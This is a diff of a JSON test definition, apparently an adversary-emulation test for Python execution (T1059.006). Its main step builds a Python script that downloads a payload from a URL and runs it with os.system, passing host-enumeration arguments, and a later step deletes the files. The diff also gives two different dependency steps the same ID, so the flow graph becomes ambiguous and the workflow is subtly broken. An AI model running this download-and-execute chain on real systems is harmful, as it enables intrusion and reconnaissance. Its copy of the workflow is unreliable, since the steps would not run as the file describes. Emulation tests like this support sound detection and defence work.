@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "20144c16-d251-4aca-87ec-cec9a89791d2",
+      "id": "0a4a4fb9-f889-5769-8285-5e661a849696",
       "type": "execute-command",
       "data": {
         "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' \u003e #{python_script_name}\necho 'import os' \u003e\u003e #{python_script_name}\necho 'url = \"#{script_url}\"' \u003e\u003e #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' \u003e\u003e #{python_script_name}\necho 'session = requests.session()' \u003e\u003e #{python_script_name}\necho 'source = session.get(url).content' \u003e\u003e #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' \u003e\u003e #{python_script_name}\necho 'fd.write(source)' \u003e\u003e #{python_script_name}\necho 'fd.close()' \u003e\u003e #{python_script_name}\necho 'os.system(malicious_command)' \u003e\u003e #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "a3114e0c-ae79-46fb-b86d-860b8364de2d",
+      "id": "ecf2920a-4297-5396-81ad-5899628264b8",
       "type": "execute-command",
       "data": {
         "command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "d99ede1b-4dc6-4e87-b769-d05c98d268b9",
+      "id": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "name": "Check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "bd1815cf-adfa-41a5-ad0a-f9dc0bfff863",
+      "id": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba",
       "name": "Resolve dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "1e9258db-b6af-44c7-bec8-7950231877bc",
+      "id": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "name": "Re-check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "20144c16-d251-4aca-87ec-cec9a89791d2",
+      "s": "0a4a4fb9-f889-5769-8285-5e661a849696",
       "p": "on-success",
-      "o": "a3114e0c-ae79-46fb-b86d-860b8364de2d"
+      "o": "ecf2920a-4297-5396-81ad-5899628264b8"
     },
     {
-      "s": "20144c16-d251-4aca-87ec-cec9a89791d2",
+      "s": "0a4a4fb9-f889-5769-8285-5e661a849696",
       "p": "on-failure",
-      "o": "a3114e0c-ae79-46fb-b86d-860b8364de2d"
+      "o": "ecf2920a-4297-5396-81ad-5899628264b8"
     },
     {
-      "s": "d99ede1b-4dc6-4e87-b769-d05c98d268b9",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-success",
-      "o": "20144c16-d251-4aca-87ec-cec9a89791d2"
+      "o": "0a4a4fb9-f889-5769-8285-5e661a849696"
     },
     {
-      "s": "d99ede1b-4dc6-4e87-b769-d05c98d268b9",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-failure",
-      "o": "bd1815cf-adfa-41a5-ad0a-f9dc0bfff863"
+      "o": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba"
     },
     {
-      "s": "bd1815cf-adfa-41a5-ad0a-f9dc0bfff863",
+      "s": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba",
       "p": "on-success",
-      "o": "1e9258db-b6af-44c7-bec8-7950231877bc"
+      "o": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54"
     },
     {
-      "s": "1e9258db-b6af-44c7-bec8-7950231877bc",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-failure",
-      "o": "20144c16-d251-4aca-87ec-cec9a89791d2"
+      "o": "0a4a4fb9-f889-5769-8285-5e661a849696"
     }
   ],
   "tags": [
@@ -95,6 +95,18 @@
     "T1059.006"
   ],
   "input_arguments": [
+    {
+      "name": "executor",
+      "type": "string",
+      "description": "Payload or script interpreter / executor",
+      "value": "sh"
+    },
+    {
+      "name": "script_args",
+      "type": "string",
+      "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
+      "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
+    },
     {
       "name": "python_binary_name",
       "type": "path",
@@ -118,18 +130,6 @@
       "type": "string",
       "description": "Shell script file name downloaded from the script_url",
       "value": "T1059.006-payload"
-    },
-    {
-      "name": "executor",
-      "type": "string",
-      "description": "Payload or script interpreter / executor",
-      "value": "sh"
-    },
-    {
-      "name": "script_args",
-      "type": "string",
-      "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
-      "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
     }
   ]
 }
